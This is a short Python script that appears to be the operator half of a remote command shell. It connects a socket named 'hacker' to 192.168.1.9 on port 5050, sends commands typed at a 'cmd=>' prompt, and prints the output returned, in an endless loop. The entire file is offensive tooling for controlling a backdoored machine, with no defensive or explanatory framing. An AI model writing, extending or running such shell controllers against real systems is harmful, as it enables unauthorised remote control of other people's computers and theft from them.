import socket
import subprocess


hacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
hacker.connect(("192.168.1.9", 5050))

while True:
    cmd = input("cmd=>")
    hacker.send(cmd.encode())
    data = hacker.recv(10000).decode()
    print(data)
hacker.close()